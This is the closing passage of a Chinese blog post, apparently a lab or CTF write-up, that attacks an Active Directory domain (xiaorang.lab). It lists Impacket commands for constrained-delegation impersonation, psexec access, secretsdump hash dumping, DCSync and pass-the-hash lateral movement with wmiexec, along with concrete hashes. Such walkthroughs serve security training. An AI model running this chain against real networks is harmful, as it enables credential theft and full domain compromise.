+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">proxychains python3 getST.py -dc-ip 172.22.60.8 xiaorang.lab/test\$:123456 -spn cifs/Fileserver.xiaorang.lab -impersonate administrator
+</span></span><span class="line"><span class="cl">export KRB5CCNAME=administrator.ccache
+</span></span><span class="line"><span class="cl">proxychains python3 psexec.py Administrator@FILESERVER.xiaorang.lab -k -no-pass -dc-ip 172.22.60.8 -codec gbk
+</span></span></code></pre></div></div><p>拿到FILESERVER机器的权限后,抓hash</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">proxychains python3 secretsdump.py -k -no-pass Fileserver.xiaorang.lab -dc-ip 172.22.60.8
+</span></span></code></pre></div></div><p>之后DCSync</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">proxychains secretsdump.py xiaorang.lab/&#39;Fileserver$&#39;:@172.22.60.8 -hashes &#39;:951d8a9265dfb652f42e5c8c497d70dc&#39; -just-dc-user Administrator
+</span></span></code></pre></div></div><p>拿到域控哈希后横传</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">proxychains python3 wmiexec.py -hashes :c3cfdc08527ec4ab6aa3e630e79d349b Administrator@172.22.60.8 -codec gbk
+</span></span></code></pre></div></div></article>
+
+        <nav class="c-post__nav">
+            
+            <a href="/post/delivery" class="c-post__nav-card c-post__nav-card--prev">
+                <h3>‹ 上一篇</h3>
+                <p class="c-post__nav-title">Delivery</p>
+            </a>
+            
+
+            
+            <a href="/post/greatwall" class="c-post__nav-card c-post__nav-card--next">
+                <h3>下一篇 ›</h3>
+                <p class="c-post__nav-title">GreatWall</p>
+            </a>
+            
+        </nav>
+    </div>
+</div>
+
+    </main>
+    <footer class="c-footer">
+        <span id="jinrishici-sentence" class="c-footer__quote">今日诗词加载中....</span>
+        <div class="c-footer__copy">
+            Copyright © <span id="currentYear">2025</span> Dionysus. All rights reserved.
+        </div>
+    </footer>
+</div>
+
+<div id="algolia-search-mask" class="c-search-mask"></div>
+<div id="algolia-search-modal" class="c-search-modal">
+    <div class="c-search-modal__box">
+        <div class="c-search-modal__header">搜索</div>
+        <div class="c-search-modal__summary" id="algolia-search-summary" style="display:none;">共找到 0 条结果</div>
+        <input type="text" id="algolia-search-input" class="c-search-modal__input" placeholder="请输入关键词..." />
+        <div id="algolia-search-results" class="c-search-modal__results"></div>
+        <div id="algolia-pagination" class="c-search-modal__pagination"></div>
+        <hr class="c-search-modal__divider" />
+    </div>
+</div>
+
+<script src='https://static.dionysus.zip/static/js/app-IJHRYWUS.js' defer></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js" defer></script>
+<script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8" defer></script>
+</body>
+</html>
+
